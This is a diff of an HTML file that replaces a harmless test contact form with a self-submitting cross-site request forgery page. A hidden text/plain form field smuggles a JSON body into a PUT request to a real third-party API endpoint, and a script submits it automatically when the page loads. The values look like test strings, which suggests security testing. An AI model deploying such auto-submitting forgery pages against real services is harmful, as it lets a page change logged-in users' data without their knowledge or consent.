@@ -1,40 +1,8 @@
-<!DOCTYPE html>
-<html lang="en-us">
-<head>
-
-  <title>testing</title>
-
-
-
-<link rel="shortcut icon" type="image/png" href="https://dnx.zone/favicon.ico" />
-<link rel="stylesheet" href="https://dnx.zone/css/test.css" /> 
-
-<div class="container">
-  <form action="javascript:alert('FOrm Sent! Thanks!!! very much!');">
-
-    <label for="fname">First Name</label>
-    <input type="text" id="fname" name="firstname" placeholder="Your name...">
-
-    <label for="lname">Last Name</label>
-    <input type="text" id="lname" name="lastname" placeholder="You're last name...">
-
-    <label for="country">Country</label>
-    <select id="country" name="country">
-      <option value="australia">Australia</option>
-      <option value="canada">Canada</option>
-      <option value="usa">USA</option>
-    </select>
-
-    <label for="subject">Subject</label>
-    <textarea id="subject" name="subject" placeholder="Write something here..." style="height:200px"></textarea>
-
-    <input type="submit" value="Submit">
-
-  </form>
-</div>
-  
-  
-  
-  
-</body>
+<html>
+  <body>
+    <form action="https://bosch-api.arduino.cc/v1/places/708edcfc-1bab-4f9b-9240-e75342b1450c" method="PUT" enctype="text/plain">
+      <input type="hidden" name="{\"city\": hahahahaha,\"address\": \"thisisjustanothertest\"}" />
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
 </html>
